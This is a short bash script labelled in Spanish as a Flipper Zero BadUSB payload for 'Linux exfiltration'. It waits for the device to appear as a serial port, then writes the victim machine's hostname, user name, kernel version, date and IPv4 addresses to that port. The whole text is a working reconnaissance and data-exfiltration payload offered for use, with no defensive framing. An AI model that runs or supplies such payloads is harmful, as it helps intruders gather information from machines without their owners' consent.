#!/bin/bash
# ==============================================================================
# Zero Buster - Payload 01: Linux Exfiltración (Reconocimiento del Sistema)
# ==============================================================================
# Espera a que Flipper Zero conmute de HID a CDC, detecta el puerto serie /dev/ttyACM*
# y transmite telemetría diagnóstica básica sin requerir conexión a Internet.
# ==============================================================================

for i in $(seq 1 60); do
    dev=$(ls -t /dev/ttyACM* 2>/dev/null | head -n1)
    [ -n "$dev" ] && break
    sleep 0.2
done

if [ -n "$dev" ]; then
    sleep 0.5
    (
        echo '=== ZERO BUSTER (LINUX RECON) ==='
        echo "Host: $(hostname)"
        echo "User: $(whoami)"
        echo "Kernel: $(uname -r)"
        echo "Date: $(date)"
        echo '=== Network ==='
        ip -4 -br a 2>/dev/null
        echo '<<<EOF>>>'
    ) > "$dev"
fi

